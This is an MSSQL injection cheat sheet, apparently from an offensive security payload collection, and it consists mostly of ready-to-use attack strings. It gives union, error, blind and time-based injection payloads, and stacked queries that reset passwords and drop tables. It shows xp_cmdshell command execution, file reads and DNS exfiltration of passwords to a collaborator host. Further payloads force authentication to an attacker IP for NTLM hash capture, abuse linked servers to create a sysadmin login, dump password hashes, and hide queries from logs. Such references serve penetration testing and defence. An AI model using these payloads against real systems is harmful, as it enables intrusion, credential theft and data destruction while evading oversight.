# MSSQL Injection

> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or "inject" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server. 


## Summary

* [MSSQL Default Databases](#mssql-default-databases)
* [MSSQL Comments](#mssql-comments)
* [MSSQL Enumeration](#mssql-enumeration)
    * [MSSQL List Databases](#mssql-list-databases)
    * [MSSQL List Tables](#mssql-list-tables)
    * [MSSQL List Columns](#mssql-list-columns)
* [MSSQL Union Based](#mssql-union-based)
* [MSSQL Error Based](#mssql-error-based)
* [MSSQL Blind Based](#mssql-blind-based)
    * [MSSQL Blind With Substring Equivalent](#mssql-blind-with-substring-equivalent)
* [MSSQL Time Based](#mssql-time-based)
* [MSSQL Stacked Query](#mssql-stacked-query)
* [MSSQL File Manipulation](#mssql-file-manipulation)
    * [MSSQL Read File](#mssql-read-file)
    * [MSSQL Write File](#mssql-write-file)
* [MSSQL Command Execution](#mssql-command-execution)
    * [XP_CMDSHELL](#xp_cmdshell)
    * [Python Script](#python-script)
* [MSSQL Out of Band](#mssql-out-of-band)
    * [MSSQL DNS Exfiltration](#mssql-dns-exfiltration)
    * [MSSQL UNC Path](#mssql-unc-path)
* [MSSQL Trusted Links](#mssql-trusted-links)
* [MSSQL Privileges](#mssql-privileges)
    * [MSSQL List Permissions](#mssql-list-permissions)
    * [MSSQL Make User DBA](#mssql-make-user-dba)
* [MSSQL Database Credentials](#mssql-database-credentials)
* [MSSQL OPSEC](#mssql-opsec)
* [References](#references)


## MSSQL Default Databases

| Name                  | Description                           |
|-----------------------|---------------------------------------|
| pubs	                | Not available on MSSQL 2005           |
| model	                | Available in all versions             |
| msdb	                | Available in all versions             |
| tempdb	            | Available in all versions             |
| northwind	            | Available in all versions             |
| information_schema	| Available from MSSQL 2000 and higher  |


## MSSQL Comments

| Type                       | Description                       |
|----------------------------|-----------------------------------|
| `/* MSSQL Comment */`      | C-style comment                   |
| `--`                       | SQL comment                       |
| `;%00`                     | Null byte                         |


## MSSQL Enumeration

| Description     | SQL Query |
| --------------- | ----------------------------------------- |
| DBMS version    | `SELECT @@version`                        |
| Database name   | `SELECT DB_NAME()`                        |
| Database schema | `SELECT SCHEMA_NAME()`                    |
| Hostname        | `SELECT HOST_NAME()`                      |
| Hostname        | `SELECT @@hostname`                       |
| Hostname        | `SELECT @@SERVERNAME`                     |
| Hostname        | `SELECT SERVERPROPERTY('productversion')` |
| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |
| Hostname        | `SELECT SERVERPROPERTY('edition')`        |
| User            | `SELECT CURRENT_USER`                     |
| User            | `SELECT user_name();`                     |
| User            | `SELECT system_user;`                     |
| User            | `SELECT user;`                            |


### MSSQL List Databases

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- for N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb 
-- (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
```

### MSSQL List Tables

```sql
-- use xtype = 'V' for views
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
```


### MSSQL List Columns

```sql
-- for the current DB only
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
```


## MSSQL Union Based

* Extract databases names

    ```sql
    $ SELECT name FROM master..sysdatabases
    [*] Injection
    [*] msdb
    [*] tempdb
    ```

* Extract tables from Injection database

    ```sql
    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
    [*] Profiles
    [*] Roles
    [*] Users
    ```

* Extract columns for the table Users

    ```sql
    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
    [*] UserId
    [*] UserName
    ```

* Finally extract the data

    ```sql
    $ SELECT  UserId, UserName from Users
    ```


## MSSQL Error Based

| Name         | Payload         |
| ------------ | --------------- |
| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |
| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |
| CAST         | `CAST((SELECT @@version) AS INT)` |

* For integer inputs

    ```sql
    convert(int,@@version)
    cast((SELECT @@version) as int)
    ```

* For string inputs

    ```sql
    ' + convert(int,@@version) + '
    ' + cast((SELECT @@version) as int) + '
    ```


## MSSQL Blind Based

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
```

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```


### MSSQL Blind With Substring Equivalent

| Function    | Example                                         |
| ----------- | ----------------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |

Examples:

```sql
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```


## MSSQL Time Based

In a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
```

```sql
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```


## MSSQL Stacked Query

* Stacked query without any statement terminator
    ```sql
    -- multiple SELECT statements
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- updating password with a stacked query
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ```

* Use a semi-colon "`;`" to add another query
    ```sql
    ProductID=1; DROP members--
    ```


## MSSQL File Manipulation

### MSSQL Read File

**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.


```sql
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
```

Example:

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```


### MSSQL Write File

```sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```


## MSSQL Command Execution

### XP_CMDSHELL

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

If you need to reactivate `xp_cmdshell` (disabled by default in SQL Server 2005)

```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

### Python Script 

> Executed by a different user than the one using `xp_cmdshell` to execute commands

```powershell
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
```


## MSSQL Out of Band

### MSSQL DNS exfiltration

Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1

* **Permission**: Requires VIEW SERVER STATE permission on the server.

    ```powershell
    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
    ```

* **Permission**: Requires the CONTROL SERVER permission.

    ```powershell
    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
    ```


### MSSQL UNC Path

MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

```sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
RESTORE LABELONLY FROM DISK = '\\attackerip\file'
RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
```


## MSSQL Trusted Links

> The links between databases work even across forest trusts.

```powershell
msf> use exploit/windows/mssql/mssql_linkcrawler
[msf> set DEPLOY true] # Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
```

Manual exploitation

```sql
-- find link
select * from master..sysservers

-- execute query through the link
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- chain multiple openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- execute shell commands
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```


## MSSQL Privileges

### MSSQL List Permissions

* Listing effective permissions of current user on the server.

    ```sql
    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
    ```

* Listing effective permissions of current user on the database.

    ```sql
    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
    ```

* Listing effective permissions of current user on a view.

    ```sql
    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
    ```

* Check if current user is a member of the specified server role.

    ```sql
    -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
    SELECT is_srvrolemember('sysadmin');
    ```


### MSSQL Make User DBA

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```


## MSSQL Database Credentials

* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`
    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
    ```
* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`
    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```


## MSSQL OPSEC

Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`

```sql
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```


## References

- [AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - June 21, 2023](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
- [Error based SQL Injection in "Order By" clause - Manish Kishan Tanwar - March 26, 2018](https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20“Order%20By”%20clause%20(MSSQL).pdf)
- [Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - January 28, 2009](https://www.exploit-db.com/papers/12975)
- [IS_SRVROLEMEMBER (Transact-SQL) - Microsoft - April 9, 2024](https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15)
- [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [MSSQL Trusted Links - HackTricks - September 15, 2024](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)
- [SQL Server - Link… Link… Link… and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6, 2013](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
- [sys.fn_my_permissions (Transact-SQL) - Microsoft - January 25, 2024](https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15)